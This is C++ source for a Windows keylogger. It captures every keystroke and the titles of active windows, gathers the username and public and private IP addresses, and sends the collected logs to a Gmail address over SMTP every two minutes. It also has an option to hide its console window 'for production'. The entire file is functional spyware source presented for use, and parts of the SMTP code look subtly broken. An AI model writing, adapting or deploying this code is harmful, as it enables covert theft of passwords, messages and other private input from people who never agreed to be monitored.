// C++ Keylogger with Gmail SMTP support
// Compile with: g++ -o keylogger.exe keylogger.cpp -lws2_32 -lwinhttp -lcrypt32 -lssl -lcrypto -static

#include <iostream>
#include <windows.h>
#include <string>
#include <vector>
#include <ctime>
#include <fstream>
#include <winhttp.h>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <map>
#include <openssl\ssl.h>
#include <openssl\err.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ssleay32.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

// Email configuration
const std::string EMAIL_FROM = "your-email@gmail.com";
const std::string EMAIL_PASSWORD = "your-app-password";  // Gmail app password
const std::string EMAIL_TO = "your-email@gmail.com";
const std::string SMTP_SERVER = "smtp.gmail.com";
const int SMTP_PORT = 465;

// Global variables
std::string logged_data;
std::string initial_msg;
std::string old_app = "";
bool running = true;
HANDLE timerThread;

// Get system username
std::string getUsername() {
    char username[256];
    DWORD size = sizeof(username);
    GetUserNameA(username, &size);
    return std::string(username);
}

// Get public IP address
std::string getPublicIP() {
    HINTERNET hInternet = WinHttpOpen(L"User-Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hInternet) return "Unknown";

    HINTERNET hConnect = WinHttpConnect(hInternet, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hInternet);
        return "Unknown";
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_NO_REQUEST_HEADERS, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hInternet);
        return "Unknown";
    }

    std::string result;
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_REQUEST_HEADERS, 0, WINHTTP_NO_REQUEST_BODY, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            char buffer[4096];
            DWORD bytesRead = 0;
            while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                result.append(buffer, bytesRead);
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hInternet);

    return result.empty() ? "Unknown" : result;
}

// Get private IP address
std::string getPrivateIP() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) return "Unknown";
    
    struct hostent* he = gethostbyname(hostname);
    if (!he) return "Unknown";

    struct in_addr** addr_list = (struct in_addr**)he->h_addr_list;
    if (addr_list[0] != NULL) {
        return std::string(inet_ntoa(*addr_list[0]));
    }
    return "Unknown";
}

// Get current timestamp
std::string getTimestamp() {
    time_t now = time(nullptr);
    char buf[32];
    strftime(buf, sizeof(buf), "%a %b %d %H:%M:%S %Y", localtime(&now));
    return std::string(buf);
}

// Get current window title
std::string getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return "";

    char title[256];
    GetWindowTextA(hwnd, title, sizeof(title));
    
    std::string windowTitle(title);
    if (windowTitle.find("Cortana") != std::string::npos) {
        return "Windows Start Menu";
    }
    return windowTitle;
}

// Convert virtual key to string
std::string virtualKeyToString(int vk) {
    static std::map<int, std::string> vkMap = {
        {VK_BACK, "[BACKSPACE] "},
        {VK_TAB, "[TAB] "},
        {VK_RETURN, "[ENTER] "},
        {VK_SHIFT, "[SHIFT] "},
        {VK_CONTROL, "[CTRL] "},
        {VK_MENU, "[ALT] "},
        {VK_ESCAPE, "[ESC] "},
        {VK_SPACE, " "},
        {VK_LEFT, "[LEFT ARROW] "},
        {VK_RIGHT, "[RIGHT ARROW] "},
        {VK_UP, "[UP ARROW] "},
        {VK_DOWN, "[DOWN ARROW] "},
        {VK_DELETE, "[DEL] "},
        {VK_HOME, "[HOME] "},
        {VK_END, "[END] "},
        {VK_PRIOR, "[PAGE UP] "},
        {VK_NEXT, "[PAGE DOWN] "},
        {VK_F1, "[F1] "},
        {VK_F2, "[F2] "},
        {VK_F3, "[F3] "},
        {VK_F4, "[F4] "},
        {VK_F5, "[F5] "},
        {VK_F6, "[F6] "},
        {VK_F7, "[F7] "},
        {VK_F8, "[F8] "},
        {VK_F9, "[F9] "},
        {VK_F10, "[F10] "},
        {VK_F11, "[F11] "},
        {VK_F12, "[F12] "},
        {VK_LSHIFT, "[L-SHIFT] "},
        {VK_RSHIFT, "[R-SHIFT] "},
        {VK_LCONTROL, "[L-CTRL] "},
        {VK_RCONTROL, "[R-CTRL] "},
        {VK_LMENU, "[L-ALT] "},
        {VK_RMENU, "[R-ALT] "},
        {VK_CAPITAL, "[CAPS LK] "},
        {VK_NUMLOCK, "[NUM LK] "},
        {VK_SCROLL, "[SCROLL LK] "},
        {VK_SNAPSHOT, "[PRNT SCR] "},
        {VK_OEM_PLUS, "="},
        {VK_OEM_MINUS, "-"},
        {VK_OEM_PERIOD, "."},
        {VK_OEM_COMMA, ","},
        {VK_OEM_1, ";"},
        {VK_OEM_2, "/"},
        {VK_OEM_3, "`"},
        {VK_OEM_4, "["},
        {VK_OEM_5, "\\"},
        {VK_OEM_6, "]"},
        {VK_OEM_7, "'"},
    };

    if (vkMap.find(vk) != vkMap.end()) {
        return vkMap[vk];
    }

    // Check for A-Z
    if (vk >= 0x41 && vk <= 0x5A) {
        // Check for shift state
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
        bool caps = (GetAsyncKeyState(VK_CAPITAL) & 0x0001);
        
        char c = (char)vk;
        if ((shift && !caps) || (!shift && caps)) {
            c = toupper(c);
        } else {
            c = tolower(c);
        }
        return std::string(1, c);
    }

    // Check for 0-9
    if (vk >= 0x30 && vk <= 0x39) {
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
        static const char* numShift = ")!@#$%^&*(";
        
        if (shift && vk >= 0x30 && vk <= 0x39) {
            return std::string(1, numShift[vk - 0x30]);
        }
        return std::string(1, (char)vk);
    }

    // Check for numpad
    if (vk >= 0x60 && vk <= 0x69) {
        return std::string(1, (char)(vk - 0x60 + '0'));
    }

    return "";
}

// Base64 encoding
std::string base64Encode(const unsigned char* input, int length) {
    static const char* base64Chars = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    std::string result;
    int i = 0;
    int j = 0;
    unsigned char charArray3[3];
    unsigned char charArray4[4];
    int padding = 0;

    while (length--) {
        charArray3[i++] = *(input++);
        if (i == 3) {
            charArray4[0] = (charArray3[0] & 0xfc) >> 2;
            charArray4[1] = ((charArray3[0] & 0x03) << 4) + ((charArray3[1] & 0xf0) >> 4);
            charArray4[2] = ((charArray3[1] & 0x0f) << 2) + ((charArray3[2] & 0xc0) >> 6);
            charArray4[3] = charArray3[2] & 0x3f;

            for(i = 0; i < 4; i++) {
                result += base64Chars[charArray4[i]];
            }
            i = 0;
        }
    }

    if (i) {
        for(j = i; j < 3; j++) {
            charArray3[j] = '\0';
        }

        charArray4[0] = (charArray3[0] & 0xfc) >> 2;
        charArray4[1] = ((charArray3[0] & 0x03) << 4) + ((charArray3[1] & 0xf0) >> 4);
        charArray4[2] = ((charArray3[1] & 0x0f) << 2) + ((charArray3[2] & 0xc0) >> 6);

        for (j = 0; j < i + 1; j++) {
            result += base64Chars[charArray4[j]];
        }
        
        padding = 3 - i;
        while (padding--) {
            result += '=';
        }
    }

    return result;
}

// Create SMTP AUTH string
std::string createAuthString(const std::string& user, const std::string& pass) {
    std::string auth = user + "\0" + pass;
    return "AUTH PLAIN " + base64Encode((const unsigned char*)auth.c_str(), auth.length()) + "\r\n";
}

// Send email via Gmail SMTP
bool sendEmail(const std::string& subject, const std::string& body) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }

    struct hostent* host = gethostbyname(SMTP_SERVER);
    if (!host) {
        closesocket(sock);
        WSACleanup();
        return false;
    }

    SOCKADDR_IN sockAddr;
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(SMTP_PORT);
    sockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

    // Connect with SSL
    SSL_library_init();
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    SSL* ssl = SSL_new(ctx);
    
    BIO* bio = BIO_new_socket(sock, BIO_NOCLOSE);
    SSL_set_bio(ssl, bio, bio);

    connect(sock, (SOCKADDR*)&sockAddr, sizeof(sockAddr));

    if (SSL_connect(ssl) != 1) {
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        closesocket(sock);
        WSACleanup();
        return false;
    }

    char buffer[4096];
    
    // Read greeting
    SSL_read(ssl, buffer, sizeof(buffer) - 1);
    
    // Send EHLO
    std::string ehlo = "EHLO localhost\r\n";
    SSL_write(ssl, ehlo.c_str(), ehlo.length());
    SSL_read(ssl, buffer, sizeof(buffer) - 1);
    
    // Send STARTTLS
    std::string starttls = "STARTTLS\r\n";
    SSL_write(ssl, starttls.c_str(), starttls.length());
    SSL_read(ssl, buffer, sizeof(buffer) - 1);
    
    // Re-do SSL handshake after STARTTLS
    SSL_set_connect_state(ssl);
    if (SSL_connect(ssl) != 1) {
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        closesocket(sock);
        WSACleanup();
        return false;
    }

    // Send EHLO again after STARTTLS
    ehlo = "EHLO localhost\r\n";
    SSL_write(ssl, ehlo.c_str(), ehlo.length());
    SSL_read(ssl, buffer, sizeof(buffer) - 1);

    // Authenticate
    std::string authStr = createAuthString(EMAIL_FROM, EMAIL_PASSWORD);
    SSL_write(ssl, authStr.c_str(), authStr.length());
    SSL_read(ssl, buffer, sizeof(buffer) - 1);
    
    if (buffer[0] != '2') {
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        closesocket(sock);
        WSACleanup();
        return false;
    }

    // MAIL FROM
    std::string mailFrom = "MAIL FROM:<" + EMAIL_FROM + ">\r\n";
    SSL_write(ssl, mailFrom.c_str(), mailFrom.length());
    SSL_read(ssl, buffer, sizeof(buffer) - 1);
    
    // RCPT TO
    std::string rcptTo = "RCPT TO:<" + EMAIL_TO + ">\r\n";
    SSL_write(ssl, rcptTo.c_str(), rcptTo.length());
    SSL_read(ssl, buffer, sizeof(buffer) - 1);
    
    // DATA
    std::string data = "DATA\r\n";
    SSL_write(ssl, data.c_str(), data.length());
    SSL_read(ssl, buffer, sizeof(buffer) - 1);
    
    // Compose email
    std::stringstream msg;
    msg << "From: " << EMAIL_FROM << "\r\n";
    msg << "To: " << EMAIL_TO << "\r\n";
    msg << "Subject: " << subject << "\r\n";
    msg << "MIME-Version: 1.0\r\n";
    msg << "Content-Type: text/plain; charset=UTF-8\r\n";
    msg << "\r\n";
    msg << body << "\r\n";
    msg << ".\r\n";
    
    SSL_write(ssl, msg.str().c_str(), msg.str().length());
    SSL_read(ssl, buffer, sizeof(buffer) - 1);
    
    // QUIT
    std::string quit = "QUIT\r\n";
    SSL_write(ssl, quit.c_str(), quit.length());
    
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    closesocket(sock);
    WSACleanup();
    
    return true;
}

// Timer thread function
DWORD WINAPI timerThreadFunc(LPVOID lpParam) {
    while (running) {
        Sleep(120000); // 2 minutes
        
        if (logged_data.length() > initial_msg.length()) {
            std::string user = getUsername();
            std::string subject = "Keylogger Log - " + user + " - " + getTimestamp();
            
            if (sendEmail(subject, logged_data)) {
                // Clear the log after sending
                logged_data = initial_msg;
            }
        }
    }
    return 0;
}

// Hide console window
void hideConsole() {
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);
}

// Main function
int main() {
    // Hide console (uncomment for production)
    // hideConsole();
    
    // Initialize logged data with system info
    std::string datetime = getTimestamp();
    std::string user = getUsername();
    std::string publicIP = getPublicIP();
    std::string privateIP = getPrivateIP();
    
    std::stringstream ss;
    ss << "[START OF LOGS]\n";
    ss << "  *~ Date/Time: " << datetime << "\n";
    ss << "  *~ User-Profile: " << user << "\n";
    ss << "  *~ Public-IP: " << publicIP << "\n";
    ss << "  *~ Private-IP: " << privateIP << "\n\n";
    
    initial_msg = ss.str();
    logged_data = initial_msg;
    
    // Start timer thread
    timerThread = CreateThread(NULL, 0, timerThreadFunc, NULL, 0, NULL);
    
    // Keyboard logging loop
    std::string currentApp = "";
    
    while (running) {
        // Check for active window change
        std::string newApp = getActiveWindowTitle();
        
        if (newApp != currentApp && !newApp.empty()) {
            std::stringstream logEntry;
            logEntry << "\n[" << getTimestamp() << "] ~ " << newApp << ": ";
            logged_data += logEntry.str();
            currentApp = newApp;
        }
        
        // Check all keys
        for (int i = 8; i <= 255; i++) {
            // Only process key down events (bit 0 set, bit 15 set)
            if (GetAsyncKeyState(i) & 0x0001) {
                if (GetAsyncKeyState(i) & 0x8000) {
                    std::string keyStr = virtualKeyToString(i);
                    if (!keyStr.empty()) {
                        logged_data += keyStr;
                    }
                }
            }
        }
        
        Sleep(10); // Prevent high CPU usage
    }
    
    // Close timer thread
    if (timerThread) {
        TerminateThread(timerThread, 0);
        CloseHandle(timerThread);
    }
    
    return 0;
}
